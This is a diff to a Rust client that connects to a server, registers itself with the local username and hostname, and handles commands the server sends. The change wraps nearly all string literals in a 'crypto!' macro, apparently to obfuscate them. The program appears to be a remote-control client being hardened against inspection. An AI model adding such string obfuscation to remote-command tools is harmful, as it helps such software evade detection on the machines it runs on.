@@ -29,7 +29,7 @@ pub async fn connect(addr: &str) {
 
             // reconnect if error
             if let Err(err) = client.run().await {
-                error!("Unexpected error: {}", err);
+                error!("{}: {}", crypto!("Unexpected error"), err);
             }
         }
 
@@ -167,12 +167,19 @@ impl Client {
         self.suspend_handler()?;
 
         // setup client name
-        self.send_command(
-            format!("/setname {}@{}", whoami::username(), whoami::hostname()).as_str(),
-        )?;
+        self.send_command(format!(
+            "{cmd} {user}@{host}",
+            cmd = crypto!("/setname"),
+            user = whoami::username(),
+            host = whoami::hostname()
+        ))?;
 
         // setting version in server
-        self.send_command(format!("/about {}", globals::CURRENT_VERSION).as_str())?;
+        self.send_command(format!(
+            "{cmd} {version}",
+            cmd = crypto!("/about"),
+            version = globals::CURRENT_VERSION,
+        ))?;
 
         while self.connected {
             // receive message from the server
@@ -186,7 +193,10 @@ impl Client {
 
             // serverd moment - Anti-DDoS
             // if the server returns `unknown command`, skip the message
-            if buf.to_ascii_lowercase().contains("unknown command") {
+            if buf
+                .to_ascii_lowercase()
+                .contains(&crypto!("unknown command"))
+            {
                 continue;
             }
 
@@ -211,7 +221,7 @@ impl Client {
 
                 if let Some((_i, cmd)) = command {
                     if args.len() < cmd.min_args() {
-                        client.send(&crypto!("Missing arguments for the command."))?;
+                        client.send(crypto!("Missing arguments for the command."))?;
 
                         return Ok(());
                     }
@@ -225,7 +235,11 @@ impl Client {
             }
 
             if let Err(err) = handle(self, buf).await {
-                error!("Unexpected error in message handler: {}", err);
+                error!(
+                    "{}: {}",
+                    crypto!("Unexpected error in message handler"),
+                    err
+                );
                 self.send(crypto!("Unexpected error"))?;
             }
         }
